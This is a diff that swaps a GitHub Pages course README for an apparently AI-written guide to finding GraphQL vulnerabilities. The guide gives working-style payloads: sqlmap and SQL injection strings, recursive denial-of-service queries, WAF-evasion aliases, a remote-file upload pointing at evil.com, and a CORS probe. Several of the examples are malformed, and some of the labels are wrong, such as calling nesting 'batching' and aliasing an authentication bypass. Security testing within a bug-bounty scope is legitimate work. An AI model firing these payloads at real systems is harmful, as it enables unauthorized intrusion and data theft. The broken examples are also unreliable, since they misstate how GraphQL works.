@@ -1,75 +1,170 @@
-<header>
+Finding GraphQL vulnerabilities requires a mix of understanding GraphQL's structure, enumeration techniques, and security testing for misconfigurations. Below is a structured approach to finding GraphQL bugs:
+1. Enumerate the GraphQL Endpoint
 
-<!--
-  <<< Author notes: Course header >>>
-  Include a 1280×640 image, course title in sentence case, and a concise description in emphasis.
-  In your repository settings: enable template repository, add your 1280×640 social image, auto delete head branches.
-  Add your open source license, GitHub uses MIT license.
--->
+GraphQL APIs are usually found at:
 
-# GitHub Pages
+    /graphql
+    /api/graphql
+    /v1/graphql
 
-_Create a site or blog from your GitHub repositories with GitHub Pages._
+You can use tools like:
 
-</header>
+ffuf -w wordlist.txt -u https://target.com/FUZZ -mc 200
 
-<!--
-  <<< Author notes: Course start >>>
-  Include start button, a note about Actions minutes,
-  and tell the learner why they should take the course.
--->
+Or check robots.txt, JavaScript files, and browser DevTools (Network tab) for endpoint discovery.
+2. Schema Introspection (If Enabled)
 
-## Welcome
+Some GraphQL APIs expose their entire schema, allowing attackers to see all queries, mutations, and object types.
 
-With GitHub Pages, you can host project blogs, documentation, resumes, portfolios, or any other static content you'd like. Your GitHub repository can easily become its own website. In this course, we'll show you how to set up your own site or blog using GitHub Pages.
+Try sending the following request:
 
-- **Who is this for**: Beginners, students, project maintainers, small businesses.
-- **What you'll learn**: How to build a GitHub Pages site.
-- **What you'll build**: We'll build a simple GitHub Pages site with a blog. We'll use [Jekyll](https://jekyllrb.com), a static site generator.
-- **Prerequisites**: If you need to learn about branches, commits, and pull requests, take [Introduction to GitHub](https://github.com/skills/introduction-to-github) first.
-- **How long**: This course takes less than one hour to complete.
+{
+  "__schema": {
+    "queryType": {
+      "name": "Query"
+    }
+  }
+}
 
-In this course, you will:
+Or use a cURL request:
 
-1. Enable GitHub Pages
-2. Configure your site
-3. Customize your home page
-4. Create a blog post
-5. Merge your pull request
+curl -X POST https://target.com/graphql -d '{"query":"{ __schema { types { name } } }"}' -H "Content-Type: application/json"
 
-### How to start this course
+If introspection is enabled, you’ll see a list of queries and types, which helps in further enumeration.
 
-<!-- For start course, run in JavaScript:
-'https://github.com/new?' + new URLSearchParams({
-  template_owner: 'skills',
-  template_name: 'github-pages',
-  owner: '@me',
-  name: 'skills-github-pages',
-  description: 'My clone repository',
-  visibility: 'public',
-}).toString()
--->
+🛠 Tool: You can automate this with:
 
-[![start-course](https://user-images.githubusercontent.com/1221423/235727646-4a590299-ffe5-480d-8cd5-8194ea184546.svg)](https://github.com/new?template_owner=skills&template_name=github-pages&owner=%40me&name=skills-github-pages&description=My+clone+repository&visibility=public)
+graphqlmap -u https://target.com/graphql --dump-schema
 
-1. Right-click **Start course** and open the link in a new tab.
-2. In the new tab, most of the prompts will automatically fill in for you.
-   - For owner, choose your personal account or an organization to host the repository.
-   - We recommend creating a public repository, as private repositories will [use Actions minutes](https://docs.github.com/en/billing/managing-billing-for-github-actions/about-billing-for-github-actions).
-   - Scroll down and click the **Create repository** button at the bottom of the form.
-3. After your new repository is created, wait about 20 seconds, then refresh the page. Follow the step-by-step instructions in the new repository's README.
+3. Find Unauthenticated Queries & Sensitive Data Exposure
 
-<footer>
+After enumerating the schema, check if any queries or mutations expose sensitive data without authentication.
 
-<!--
-  <<< Author notes: Footer >>>
-  Add a link to get support, GitHub status page, code of conduct, license link.
--->
+Try querying:
 
----
+{
+  "query": "{ users { id, email, passwordHash } }"
+}
 
-Get help: [Post in our discussion board](https://github.com/orgs/skills/discussions/categories/github-pages) &bull; [Review the GitHub status page](https://www.githubstatus.com/)
+If the API returns emails, hashed passwords, or PII, report it immediately.
 
-&copy; 2023 GitHub &bull; [Code of Conduct](https://www.contributor-covenant.org/version/2/1/code_of_conduct/code_of_conduct.md) &bull; [MIT License](https://gh.io/mit)
+🔍 Check for:
 
-</footer>
+    User emails, tokens, or hashed passwords.
+    Internal API keys or configurations.
+    Business-sensitive data exposure.
+
+4. Mass Assignment & Over-Privileged Queries
+
+GraphQL doesn’t have built-in field restrictions, so developers might accidentally allow users to modify more fields than intended.
+
+    If you can update your role using:
+
+{
+  "mutation": "mutation { updateUser(id: 1, role: 'admin') { id, role } }"
+}
+
+and it succeeds, it’s a high-severity privilege escalation bug.
+5. GraphQL Injection (SQLi, NoSQLi)
+
+GraphQL inputs are sometimes directly used in database queries, leading to SQL Injection or NoSQL Injection.
+
+    Try testing:
+
+{
+  "query": "{ user(id: \"1 OR 1=1\") { name, email } }"
+}
+
+or
+
+{
+  "query": "{ user(id: \"admin' --\") { name, email } }"
+}
+
+If the server returns unexpected results or errors, the API might be vulnerable to SQL injection.
+
+🛠 Tool: sqlmap can be used:
+
+sqlmap -u "https://target.com/graphql" --data '{"query":"{ user(id: \"1\") { email } }"}' --dbs
+
+6. DoS via Deep Query (GraphQL Query Batching)
+
+Some GraphQL APIs allow users to send complex, recursive queries that consume excessive resources, leading to a Denial of Service (DoS).
+
+    Send a recursive query like:
+
+{
+  "query": "{ user { posts { author { posts { author { posts { author { name } } } } } } } }"
+}
+
+If the server crashes or slows down, report a DoS vulnerability.
+7. Bypass Authentication with Aliases
+
+Some GraphQL implementations allow query aliasing, which can help bypass certain security controls.
+
+If a query like this is blocked:
+
+{
+  "query": "{ user(id:1) { name, email } }"
+}
+
+Try using an alias to trick the WAF:
+
+{
+  "query": "{ alias1: user(id:1) { name, email } alias2: user(id:2) { name, email } }"
+}
+
+If the request is processed, you’ve bypassed the restriction.
+8. File Upload Vulnerabilities
+
+Some GraphQL APIs allow file uploads, which can lead to:
+✅ Arbitrary File Upload (RCE possibility)
+✅ SSRF (Server-Side Request Forgery)
+
+Try sending:
+
+{
+  "query": "mutation { uploadFile(file:\"http://evil.com/malicious.php\") }"
+}
+
+    If the server processes remote files, it’s vulnerable to SSRF.
+    If you can upload PHP/JSP/HTML files, you might get RCE.
+
+9. CORS Misconfiguration
+
+Check if the API allows cross-origin requests:
+
+curl -H "Origin: evil.com" -H "Access-Control-Request-Method: POST" -X OPTIONS https://target.com/graphql -v
+
+If it responds with:
+
+Access-Control-Allow-Origin: *
+
+then any website can interact with the API, leading to account takeover via stolen API keys.
+10. Automated GraphQL Security Testing
+
+If you want to automate GraphQL security testing, use:
+
+    GraphQLmap (graphqlmap -u https://target.com/graphql)
+    InQL (Burp Suite Plugin)
+    GraphQL Voyager (for schema visualization)
+
+Bug Report Example
+
+Title: GraphQL API Exposes User Emails Without Authentication
+Description: The GraphQL API allows unauthenticated users to query sensitive user details. The following request exposes user emails:
+
+{
+  "query": "{ users { id, email } }"
+}
+
+Impact: An attacker can scrape all registered user emails, leading to phishing or spam attacks.
+Recommendation: Implement proper authentication checks and restrict query access.
+Final Notes
+
+    Always check the bug bounty scope before testing.
+    Never test on live systems without permission.
+    Avoid running DoS attacks on production environments.
+
+Would you like help with a specific target or PoC? 🚀
+
